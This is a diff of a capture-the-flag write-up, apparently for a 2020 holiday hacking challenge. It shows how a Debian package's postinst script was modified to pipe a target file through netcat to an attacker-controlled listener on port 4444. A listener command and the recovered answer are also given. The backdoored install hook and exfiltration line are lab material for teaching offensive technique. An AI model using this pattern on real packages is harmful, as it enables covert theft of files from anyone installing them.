@@ -38,13 +38,14 @@ This package was modified to include this line in the postinst script:
 
     /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
 
-and then made available in the web tree folder as pub/jfrost/backdoor/suriv_amd64.deb.
+and then made available in the web tree folder as `pub/jfrost/backdoor/suriv_amd64.deb`.
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
 
     nc -lvp 4444 > text
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTYzNDM5NDk0MSwxMjA0NDI2NTM5LC0xNz
-k4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5MTU5XX0=
+eyJoaXN0b3J5IjpbMTc1ODI0MzY3NywxNjM0Mzk0OTQxLDEyMD
+Q0MjY1MzksLTE3OTg0MTU4OTYsLTg3ODM5MjIxNiw1MTQyMDkx
+NTldfQ==
 -->
